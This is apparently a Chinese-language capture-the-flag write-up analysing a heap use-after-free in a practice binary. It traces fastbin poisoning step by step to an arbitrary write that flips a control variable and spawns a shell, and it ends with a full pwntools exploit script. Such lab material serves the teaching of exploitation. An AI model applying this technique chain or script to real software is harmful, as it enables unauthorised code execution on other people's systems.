## 漏洞成因
### 关键结构体分析
程序未显式定义结构体，但使用以下关键全局变量（基于反编译代码）：
- **`buf`数组**：类型为`void*`，大小4个元素，存储分配的内存块指针。
- **`dword_6020BC`**：类型为`int`，作为分配计数器，跟踪当前已分配块数（0-3）。
- **`qword_602090`**：类型为`unsigned __int64`，控制变量，若为0则启动shell。

### 漏洞分析（结合反编译代码和动态调试）
1. **Use-After-Free (UAF) 漏洞**：
   - **位置**：`sub_4009D7`（释放函数）和`sub_400A4D`（写入函数）。
   - **成因**：释放内存块后，`buf`数组中对应指针未被置空。攻击者可通过索引访问已释放内存并写入数据，导致堆元数据被破坏。
   - **动态调试证据**：Step 1中，`delete(0)`后`buf[0]`仍指向已释放chunk（0x3c73d010），后续`edit(0)`可写入该地址。

2. **双重释放 (Double-Free) 漏洞**：
   - **位置**：`sub_4009D7`（释放函数）。
   - **成因**：释放操作未检查指针是否已释放，用户可多次释放同一索引，导致堆管理器状态不一致。
   - **潜在风险**：在exp中未直接利用，但可通过多次`delete(0)`触发。

3. **索引越界漏洞**：
   - **位置**：`sub_4009D7`和`sub_400A4D`中的索引处理。
   - **成因**：使用`atoi(s)`转换用户输入，但未验证索引范围（0-3），可能访问越界内存。

**根本原因**：程序缺乏内存管理的安全检查（如释放后置空指针、索引验证），结合堆分配机制，允许攻击者通过UAF修改fastbin链表，最终实现任意地址写入。

## 漏洞利用过程
基于exp步进的调试信息，整个利用过程涉及堆内存和全局变量的变化。下表总结了关键操作及内存状态变化：

| 步骤 | exp操作 | 堆内存关键变化 | 全局变量关键变化 | 漏洞利用效果 |
|------|---------|----------------|------------------|-------------|
| 1 | `add(0x40); add(0x20); delete(0)` | - 分配chunk 0 (0x3c73d000, size=0x50) 和 chunk 1 (0x3c73d050, size=0x30)<br>- 释放chunk 0：进入fastbin 0x50，fd=0x0 | - `dword_6020BC`=2<br>- `buf[0]`=0x3c73d010（未置空） | UAF漏洞形成：`buf[0]`指向已释放内存 |
| 2 | `edit(0, p64(0x602080))` | - 通过UAF修改chunk 0的fd指针为0x602080（全局数据区地址）<br>- fastbin链：0x50 → 0x3c73d000 → 0x602080 | - `buf[0]`仍指向0x3c73d010（内容被覆盖） | 污染fastbin链，为任意地址分配奠基 |
| 3 | `add(0x40); add(0x40)` | - 第一次分配：获取chunk 0 (0x3c73d000)<br>- 第二次分配：从污染链分配，得到地址0x602090（指向`qword_602090`） | - `dword_6020BC`=4<br>- `buf[2]`=0x3c73d010（双重分配）<br>- `buf[3]`=0x602090 | 实现任意地址分配：`buf[3]`指向目标变量 |
| 4 | `edit(3, p64(0))` | - 通过`buf[3]`写入数据，直接修改内存地址0x602090 | - `qword_602090`=0x0（原为0x1） | 覆盖控制变量，满足shell触发条件 |
| 5 | `backdoor()` | - 触发`system("/bin/sh")`，进程替换为`/bin/dash`<br>- 堆被重用，状态正常化 | - 程序控制流转移 | 成功获取shell权限 |
| 6 | `p.interactive()` | - 进入交互式shell，内存映射显示`/bin/dash`代码段 | - 无进一步变化 | 利用完成，系统控制权移交 |

**内存变化总结**：
- **初始状态**：堆为空，`qword_602090=0x1`。
- **最终状态**：`qword_602090=0x0`，进程运行`/bin/dash`，堆管理器状态稳定。
- **利用链**：UAF → fastbin污染 → 任意地址分配 → 关键变量覆盖 → shell获取。

## Exploit
以下是漏洞利用脚本（exp），在关键位置添加注释解释利用逻辑：

```python
from pwn import *

# 设置调试环境和上下文
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/sample14')
elf = ELF('./data/sample14')
libc = elf.libc

# 定义辅助函数封装程序功能
def add(size):
    p.recvuntil(b'choice>\n')
    p.sendline(b'1')
    p.recvuntil(b'size>\n')
    p.sendline(str(size))

def delete(index):
    p.recvuntil(b'choice>\n')
    p.sendline(b'2')
    p.recvuntil(b'index>\n')
    p.sendline(str(index))

def edit(index, content):
    p.recvuntil(b'choice>\n')
    p.sendline(b'3')
    p.recvuntil(b'index>\n')
    p.sendline(str(index))
    p.send(content)  # 写入8字节数据，利用UAF或越界

def backdoor():
    p.recvuntil(b'choice>\n')
    p.sendline(b'4')

# 漏洞利用主逻辑
add(0x40); add(0x20); delete(0)  # Step 1: 分配两个chunk后释放索引0，制造UAF漏洞
edit(0, p64(0x602080))           # Step 2: 通过UAF修改已释放chunk的fd指针，指向全局数据区（0x602080）
add(0x40); add(0x40)             # Step 3: 双重分配，第二次分配从污染链获取地址0x602090（指向qword_602090）
edit(3, p64(0))                  # Step 4: 通过buf[3]（指向0x602090）写入0，覆盖控制变量
backdoor()                       # Step 5: 触发backdoor，启动shell
p.interactive()                  # Step 6: 进入交互模式，获取系统控制权
```

**注释说明**：
- **Step 1**：创建UAF条件，`delete(0)`后`buf[0]`未置空，允许后续写入已释放内存。
- **Step 2**：关键利用步骤，通过UAF覆盖fd指针，将fastbin链重定向到全局数据区地址0x602080（靠近`qword_602090`）。
- **Step 3**：利用污染后的fastbin链分配内存，第一次分配回收原chunk，第二次分配获取目标地址0x602090。
- **Step 4**：直接修改`qword_602090`为0，满足`system("/bin/sh")`触发条件。
- **Step 5-6**：启动shell并交互，完成利用。

此exp利用UAF漏洞实现了任意地址写入，最终通过修改全局变量获取shell权限，展示了堆漏洞利用的典型技术链。
